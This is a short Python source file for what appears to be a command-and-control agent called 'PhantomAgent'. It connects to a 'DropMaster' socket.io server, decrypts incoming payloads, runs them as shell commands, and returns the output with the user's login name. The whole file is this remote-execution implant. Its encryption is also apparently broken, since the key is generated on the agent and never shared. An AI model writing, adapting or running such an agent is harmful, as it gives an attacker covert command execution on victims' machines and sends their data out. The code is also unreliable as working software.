import socketio
import os
import base64
from cryptography.fernet import Fernet

SERVER_URL = "http://localhost:8080"  # Replace with public if needed

class PhantomAgent:
    def __init__(self):
        self.sio = socketio.Client()
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.register_handlers()
        self.sio.connect(SERVER_URL)
        print("[+] Agent connected to DropMaster server...")

    def register_handlers(self):
        @self.sio.on("deploy")
        def handle_payload(data):
            enc = data.get("payload")
            print("[📦] Encrypted payload received")
            try:
                decrypted = self.cipher.decrypt(base64.b64decode(enc)).decode()
                print(f"[📥 EXEC] {decrypted}")
                result = os.popen(decrypted).read()
                self.sio.emit("result", {
                    "output": result,
                    "agent": os.getlogin()
                })
            except Exception as e:
                self.sio.emit("result", {
                    "output": f"[ERROR] {str(e)}",
                    "agent": os.getlogin()
                })

if __name__ == "__main__":
    PhantomAgent()
